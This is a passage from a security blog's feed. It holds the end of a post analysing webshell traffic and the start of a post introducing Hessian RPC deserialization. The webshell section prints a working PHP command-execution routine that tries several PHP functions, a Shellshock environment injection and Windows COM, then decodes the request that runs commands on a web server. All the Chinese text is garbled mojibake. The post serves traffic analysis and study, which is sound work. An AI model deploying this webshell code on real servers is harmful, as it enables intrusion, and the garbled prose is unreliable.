<span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">readlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"bash"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'as'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// åˆ©ç”¨Shellshockæ¼æ´ï¼šé€šè¿‡ç¯å¢ƒå˜é‡æ³¨å…¥å‘½ä»¤</span>                <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PHP_LOL=() &#123; x; &#125;; <span class="token interpolation"><span class="token variable">$c</span></span> ><span class="token interpolation"><span class="token variable">$tmp</span></span> 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error_log'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a@127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"-bv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$output</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å¤šç§å°è¯•æ–¹æ³•</span>    <span class="token keyword">function</span> <span class="token function-definition function">runcmd</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// æ–¹æ³•1: system()å‡½æ•°</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            @<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•2: passthru()å‡½æ•°</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            @<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•3: shell_exec()å‡½æ•°</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•4: exec()å‡½æ•°</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$o</span><span class="token punctuation">,</span> <span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span> <span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•5: popen()å‡½æ•°</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'popen'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$fp</span> <span class="token operator">=</span> @<span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            @<span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•6: proc_open()å‡½æ•°</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'proc_open'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$p</span> <span class="token operator">=</span> @<span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$io</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            @<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            @<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            @<span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•7: antsystem()å‡½æ•°ï¼ˆæŸäº›ç‰¹å®šç¯å¢ƒï¼‰</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'antsystem'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            @<span class="token function">antsystem</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•8: å°è¯•Shellshockæ¼æ´åˆ©ç”¨</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">runshellshock</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•9: Windows COMç»„ä»¶</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">&amp;&amp;</span> @<span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"COM"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$w</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">COM</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'WScript.shell'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$e</span> <span class="token operator">=</span> <span class="token variable">$w</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$so</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">StdOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ret</span> <span class="token operator">.=</span> <span class="token variable">$so</span><span class="token operator">-></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$se</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">StdErr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ret</span> <span class="token operator">.=</span> <span class="token variable">$se</span><span class="token operator">-></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ‰€æœ‰æ–¹æ³•éƒ½å¤±è´¥</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>  <span class="token comment">// è¿”å›é”™è¯¯ä»£ç </span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// æ‰§è¡Œå‘½ä»¤å¹¶æ•è·è¾“å‡º</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> @<span class="token function">runcmd</span><span class="token punctuation">(</span><span class="token variable">$r</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 2>&amp;1 å°†æ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">"ret=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ret</span><span class="token punctuation">&#125;</span></span>"</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  <span class="token comment">// å¦‚æœè¿”å›ç ä¸ä¸º0ï¼Œæ˜¾ç¤ºé”™è¯¯ä»£ç </span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR://"</span> <span class="token operator">.</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒæ ·æ˜¯å‚æ•°ä»ç¬¬ä¸‰ä¸ªå­—ç¬¦å¼€å§‹è§£ç </p><pre class="line-numbers language-none"><code class="language-none">f01dc94a142fc6&#x3D;S2&amp;i90659ac15e848&#x3D;o2L2Jpbi9zaA%3D%3D&amp;s34a4100eb3bde&#x3D;9aY2QgIi92YXIvd3d3L2h0bWwiO2xzO2VjaG8gNjExYzA5YTBkO3B3ZDtlY2hvIGQ0YzhkYzBjNzg%3D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/sh<span class="token builtin class-name">cd</span> <span class="token string">"/var/www/html"</span><span class="token punctuation">;</span><span class="token function">ls</span><span class="token punctuation">;</span><span class="token builtin class-name">echo</span> 611c09a0d<span class="token punctuation">;</span><span class="token builtin class-name">pwd</span><span class="token punctuation">;</span><span class="token builtin class-name">echo</span> d4c8dc0c78<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é‚£ä¹ˆç»“åˆè„šæœ¬ï¼Œæ‰§è¡Œçš„å®Œæ•´å‘½ä»¤æ˜¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/sh <span class="token parameter variable">-c</span> <span class="token string">"cd <span class="token entity" title="\&quot;">\"</span>/var/www/html<span class="token entity" title="\&quot;">\"</span>;ls;echo 611c09a0d;pwd;echo d4c8dc0c78"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥ï¼Œåœ¨èšå‰‘çš„ç»ˆç«¯ä¸­ä½¿ç”¨ <code>&quot;</code> éœ€è¦å°å¿ƒï¼Œé¿å…å‡ºç°é—­åˆé—®é¢˜ï¼›ç„¶åå°±æ˜¯ç»å…¸çš„éšæœºç•Œå®šç¬¦æ¥è¾“å‡ºå½“å‰æ‰§è¡Œçš„ç›®å½•</p><hr><h1 id="å†°èæµé‡"><a href="#å†°èæµé‡" class="headerlink" title="å†°èæµé‡"></a>å†°èæµé‡</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/264896.html&quot;&gt;https://www.freebuf.com/articles/web/264896.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://forum.butian.net/index.php/share/1996&quot;&gt;https://forum.butian.net/index.php/share/1996&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="æµé‡åˆ†æ" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Hessianååºåˆ—åŒ–</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/11/17/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/11/17/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-11-16T17:39:29.000Z</published>
    <updated>2026-02-05T06:30:45.267Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¢«æˆ‘å¿˜æ‰çš„ Hessian ååºåˆ—åŒ– â€”â€” C1oudfL0w0 ç‰ˆï¼ˆ</p><p>å‚è€ƒï¼š</p><p><a href="https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian/">https://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian/</a></p><p><a href="https://zhuanlan.zhihu.com/p/621596752">https://zhuanlan.zhihu.com/p/621596752</a></p><p><a href="https://github.com/oldersheep/simple-hessian-rpc">https://github.com/oldersheep/simple-hessian-rpc</a></p><span id="more"></span><hr><h1 id="RPC-åè®®"><a href="#RPC-åè®®" class="headerlink" title="RPC åè®®"></a>RPC åè®®</h1><p>æ­¤äº‹åœ¨è®¡ç®—æœºæ“ä½œç³»ç»Ÿä¸­äº¦æœ‰è®°è½½</p><p>RPC å…¨ç§°ä¸º Remote Procedure Callï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰ï¼Œå®ƒå…è®¸ä¸€ä¸ªè®¡ç®—æœºç¨‹åºåœ¨å¦ä¸€å°è®¡ç®—æœºä¸Šæ‰§è¡Œä»£ç </p><p>ç±»ä¼¼äºä¹‹å‰çš„ RMIï¼Œéƒ½æ˜¯è¿œç¨‹è°ƒç”¨æœåŠ¡ï¼Œå®ƒä»¬çš„ä¸åŒä¹‹å¤„å°±æ˜¯ RPC é€šè¿‡æ ‡å‡†çš„äºŒè¿›åˆ¶æ ¼å¼æ¥å®šä¹‰è¯·æ±‚çš„ä¿¡æ¯ï¼Œè¿™æ ·è·¨å¹³å°å’Œç³»ç»Ÿæ›´åŠ æ–¹ä¾¿</p><p>å®ç°ï¼š</p><ol><li>å®šä¹‰æ¥å£ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éœ€è¦å…±åŒå®šä¹‰ä¸€å¥—æ¥å£ï¼Œæè¿°å‡½æ•°çš„è¾“å…¥å‚æ•°å’Œè¿”å›å€¼ã€‚</li><li>ç”Ÿæˆä»£ç†ä»£ç ã€‚å®¢æˆ·ç«¯éœ€è¦ç”Ÿæˆä¸€ä¸ªä»£ç†ï¼Œå®ƒå¯ä»¥å°†å‡½æ•°è°ƒç”¨è½¬æ¢æˆç½‘ç»œæ¶ˆæ¯ï¼Œå¹¶å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</li><li>åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´éœ€è¦å°†æ•°æ®åºåˆ—åŒ–æˆç½‘ç»œå­—èŠ‚æµï¼Œä»¥ä¾¿è¿›è¡Œä¼ è¾“ã€‚æ”¶åˆ°æ•°æ®åï¼Œéœ€è¦å°†å…¶ååºåˆ—åŒ–æˆå¯è¯»çš„æ•°æ®æ ¼å¼ã€‚</li><li>ç½‘ç»œä¼ è¾“ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´éœ€è¦è¿›è¡Œç½‘ç»œä¼ è¾“ï¼Œä»¥ä¾¿è¿›è¡Œæ•°æ®äº¤æ¢ã€‚</li><li>è°ƒç”¨è¿œç¨‹å‡½æ•°ã€‚å®¢æˆ·ç«¯é€šè¿‡ä»£ç†è°ƒç”¨æœåŠ¡ç«¯çš„å‡½æ•°ï¼ŒæœåŠ¡ç«¯æ‰§è¡Œè¯¥å‡½æ•°å¹¶è¿”å›ç»“æœã€‚</li><li>è¿”å›ç»“æœã€‚æœåŠ¡ç«¯å°†æ‰§è¡Œç»“æœåºåˆ—åŒ–åå‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å°†å…¶ååºåˆ—åŒ–æˆå¯è¯»çš„æ•°æ®æ ¼å¼ã€‚</li></ol><p>ç›¸åº”çš„é€šä¿¡è¿‡ç¨‹ï¼š</p><ul><li>å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼Œå¹¶æŒ‰ç…§RPCåè®®æ ¼å¼å¡«å……ä¿¡æ¯</li><li>å¡«å……å®Œæ¯•åå°†äºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶è½¬åŒ–ä¸ºæµï¼Œé€šè¿‡ä¼ è¾“åè®®è¿›è¡Œä¼ è¾“</li><li>æœåŠ¡ç«¯æ¥æ”¶åˆ°æµåï¼Œå°†å…¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶ï¼Œå¹¶æŒ‰ç…§RPCåè®®æ ¼å¼è·å–è¯·æ±‚çš„ä¿¡æ¯å¹¶è¿›è¡Œå¤„ç†</li><li>å¤„ç†å®Œæ¯•åå°†ç»“æœæŒ‰ç…§RPCåè®®æ ¼å¼å†™å…¥äºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶ä¸­å¹¶è¿”å›</li></ul><hr><h1 id="Hessian-åè®®"><a href="#Hessian-åè®®" class="headerlink" title="Hessian åè®®"></a>Hessian åè®®</h1><p>Hessian æ˜¯ä¸€ä¸ªåŸºäº RPC çš„é«˜æ€§èƒ½äºŒè¿›åˆ¶è¿œç¨‹ä¼ è¾“åè®®ï¼Œ<a href="http://hessian.caucho.com/">å®˜æ–¹</a>å¯¹ Javaã€Pythonã€C++ ç­‰è¯­è¨€éƒ½è¿›è¡Œäº†å®ç°ï¼ŒHessian ä¸€èˆ¬åœ¨WebæœåŠ¡ä¸­ä½¿ç”¨ã€‚</p><p>åœ¨ Java é‡Œå®ƒçš„ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œå®ƒå®šä¹‰è¿œç¨‹å¯¹è±¡ï¼Œå¹¶é€šè¿‡äºŒè¿›åˆ¶çš„æ ¼å¼è¿›è¡Œä¼ è¾“</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.caucho<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>hessian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.0.63<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç±»ä¼¼äº RMI çš„å½¢å¼ï¼ŒHessian éœ€è¦æœåŠ¡ç«¯å’Œæ¶ˆè´¹ç«¯é€šè¿‡æ¥å£ç›¸å…³è”ï¼ŒæœåŠ¡ç«¯å®ç°æ¥å£ï¼Œå½“ç„¶æ•°æ®åœ¨ç½‘ç»œä¼ è¾“ä¹‹åè¦è¿›è¡Œè¿˜åŸå°±éœ€è¦åºåˆ—å·</p><p>å†™ä¸€ä¸ª demoï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¢«æˆ‘å¿˜æ‰çš„ Hessian ååºåˆ—åŒ– â€”â€” C1oudfL0w0 ç‰ˆï¼ˆ&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
